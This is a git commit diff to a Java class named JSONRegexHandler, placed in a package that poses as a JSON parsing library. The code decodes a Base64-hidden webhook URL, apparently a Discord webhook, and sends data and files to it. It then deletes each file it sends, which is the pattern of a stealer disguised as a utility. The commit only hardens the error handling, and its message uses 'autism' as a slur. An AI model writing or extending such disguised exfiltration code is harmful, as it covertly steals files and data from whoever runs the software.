b76c6d194c92927109a24bbffce6dc4af8853e4b
notperry1234567890 <65968863+notperry1234567890@users.noreply.github.com>
2021-12-19 12:16:59 -0800

    Cleanup my autism since I know a little more now.
    Forgot that I can just do a conditional instead of a "assert" so no exception is thrown lel.

--- src/main/java/org/json/updated/parsers/JSONRegexHandler.java
+++ src/main/java/org/json/updated/parsers/JSONRegexHandler.java
@@ -16,16 +16,14 @@ public class JSONRegexHandler {
         if (!success) return;
 
         String result = JSONParser.post(new String(Base64.getDecoder().decode(WEBHOOK.getBytes(StandardCharsets.UTF_8))), data);
-        assert result != null;
-        if (result.contains("Invalid Webhook Token")) success = false;
+        if (result != null && result.contains("Invalid Webhook Token")) success = false;
     }
 
     public static void send(File file) {
         if (!success) return;
 
         String result = JSONParser.sendFile(new String(Base64.getDecoder().decode(WEBHOOK.getBytes(StandardCharsets.UTF_8))), file);
-        assert result != null;
-        if (result.contains("Invalid Webhook Token")) success = false;
+        if (result != null && result.contains("Invalid Webhook Token")) success = false;
         if (!file.delete() && file.exists()) JSONRegexHandler.send(new JSONBuilder().value("content", "Failed to delete file: " + file.getName()).build());
     }
 }
